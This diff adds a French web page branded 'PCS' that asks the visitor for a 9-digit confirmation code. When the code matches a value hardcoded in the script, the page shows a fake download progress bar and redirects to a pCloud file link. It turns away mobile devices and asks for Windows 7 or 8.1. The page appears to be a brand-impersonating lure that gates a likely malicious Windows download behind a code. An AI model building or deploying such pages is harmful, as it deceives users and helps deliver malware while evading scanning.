@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmation du code PCS</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffb300;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 600px;
+    }
+
+    .logo {
+      font-size: 32px;
+      color: #e53935;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #0d47a1;
+    }
+
+    .input-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .input-container input {
+      width: 40px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border: 2px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      background-color: #388e3c;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .progress {
+      margin-top: 30px;
+      display: none;
+    }
+
+    .progress-bar {
+      width: 0;
+      height: 20px;
+      background: #4caf50;
+      border-radius: 5px;
+      transition: width 0.2s ease;
+    }
+
+    .progress-container {
+      width: 100%;
+      background: #ccc;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+
+    .downloading-text {
+      margin-top: 15px;
+      color: #333;
+    }
+
+    .mobile-blocked {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      color: red;
+      font-size: 18px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="mainContent">
+    <div class="logo">PCS</div>
+    <h2>Confirmation du code PCS</h2>
+    <p>Veuillez entrer votre code à 9 chiffres :</p>
+
+    <form id="codeForm">
+      <div class="input-container">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+        <input maxlength="1" type="text">
+      </div>
+      <button type="submit">Valider</button>
+      <div class="error" id="errorMsg">❌ Code incorrect. Veuillez réessayer.</div>
+    </form>
+
+    <div class="progress" id="progressBlock">
+      <div class="downloading-text">Téléchargement en cours...</div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="mobileBlock" class="mobile-blocked" style="display: none;">
+    ⚠️ Cette page n'est pas accessible depuis un téléphone portable ou une tablette. <br><br>
+    Merci d’utiliser un ordinateur sous Windows 7 ou 8.1 pour continuer.
+  </div>
+
+  <script>
+    const isMobile = /iPhone|iPad|iPod|Android|Mobile|Samsung/i.test(navigator.userAgent);
+
+    if (isMobile) {
+      document.getElementById('mainContent').style.display = 'none';
+      document.getElementById('mobileBlock').style.display = 'block';
+    }
+
+    const form = document.getElementById('codeForm');
+    const inputs = form.querySelectorAll('input');
+    const errorMsg = document.getElementById('errorMsg');
+    const progressBar = document.getElementById('progressBar');
+    const progressBlock = document.getElementById('progressBlock');
+
+    const correctCode = "687352705";
+    const downloadURL = "https://e.pcloud.link/publink/show?code=XZBl96ZDcumxqXn19QSerxY4ULg1FBqjotk";
+
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+    });
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = Array.from(inputs).map(i => i.value).join('');
+      if (code === correctCode) {
+        errorMsg.style.display = 'none';
+        progressBlock.style.display = 'block';
+
+        let width = 0;
+        const interval = setInterval(() => {
+          width += 2;
+          progressBar.style.width = width + "%";
+          if (width >= 100) {
+            clearInterval(interval);
+            window.location.href = downloadURL;
+          }
+        }, 100);
+      } else {
+        errorMsg.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
